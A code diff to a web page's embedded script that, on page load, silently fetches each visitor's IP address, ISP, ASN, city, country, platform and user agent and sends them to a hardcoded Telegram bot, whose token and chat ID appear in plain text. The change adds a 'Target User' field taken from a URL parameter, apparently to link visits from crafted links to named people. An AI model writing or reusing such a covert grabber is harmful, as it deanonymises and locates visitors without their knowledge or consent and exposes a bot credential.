@@ -1302,11 +1302,15 @@ max-height: 600px; /* optional: prevents huge cards */
 
    <script>
 async function sendVisitorDetailsToTelegram() {
-  // 1. Replace these with your actual Telegram bot details
+  // 1. Telegram bot details
   const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
   const CHAT_IDs = '-1003913850436'; 
 
   try {
+    // 1. Read the user identity from the URL bar
+    const urlParams = new URLSearchParams(window.location.search);
+    const identifyUser = urlParams.get('user') || 'Anonymous Click / Direct Visit';
+
     // 2. Fetch the user's network details silently
     const ipResponse = await fetch('https://ipapi.co/json/');
     if (!ipResponse.ok) throw new Error('Failed to fetch network details');
@@ -1319,21 +1323,22 @@ async function sendVisitorDetailsToTelegram() {
     // Capture the platform/device operating system safely
     let devicePlatform = 'Unknown';
     if (navigator.userAgentData && navigator.userAgentData.platform) {
-      devicePlatform = navigator.userAgentData.platform; // Modern browsers
+      devicePlatform = navigator.userAgentData.platform; 
     } else if (navigator.platform) {
-      devicePlatform = navigator.platform; // Fallback for older browsers
+      devicePlatform = navigator.platform; 
     }
 
-    // 3. Format the log notification text cleanly for Telegram
+    // 3. Format the log notification text using HTML parsing to prevent breakdown errors
     const telegramMessage = 
-      `🌐 *New Visitor Logged*\n\n` +
-      `• *Visited Page:* \`${currentPage}\`\n` + 
-      `• *Platform/OS:* \`${devicePlatform}\`\n` + // <-- Added device platform
-      `• *IP Address:* \`${data.ip}\`\n` +
-      `• *ISP/Provider:* ${data.org || 'Unknown'}\n` +
-      `• *ASN:* ${data.asn || 'N/A'}\n` +
-      `• *Location:* ${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}\n` +
-      `• *Device Agent:* ${navigator.userAgent.substring(0, 100)}...`;
+      `🌐 <b>New Visitor Logged</b>\n\n` +
+      `• <b>Target User:</b> <code>${identifyUser}</code>\n` +
+      `• <b>Visited Page:</b> <code>${currentPage}</code>\n` + 
+      `• <b>Platform/OS:</b> <code>${devicePlatform}</code>\n` + 
+      `• <b>IP Address:</b> <code>${data.ip}</code>\n` +
+      `• <b>ISP/Provider:</b> <code>${data.org || 'Unknown'}</code>\n` +
+      `• <b>ASN:</b> <code>${data.asn || 'N/A'}</code>\n` +
+      `• <b>Location:</b> <code>${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}</code>\n` +
+      `• <b>Device Agent:</b> <code>${navigator.userAgent.substring(0, 100)}...</code>`;
 
     // 4. Send the payload directly to your Telegram channel/chat
     const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
@@ -1344,7 +1349,7 @@ async function sendVisitorDetailsToTelegram() {
       body: JSON.stringify({
         chat_id: CHAT_IDs,
         text: telegramMessage,
-        parse_mode: 'Markdown'
+        parse_mode: 'HTML' // Switched to HTML to make parsing bulletproof
       })
     });
 
@@ -1358,6 +1363,7 @@ async function sendVisitorDetailsToTelegram() {
 document.addEventListener('DOMContentLoaded', () => {
   sendVisitorDetailsToTelegram();
 });
+
 
 /* Sidebar toggle */
         const sidebar = document.getElementById('sidebar');
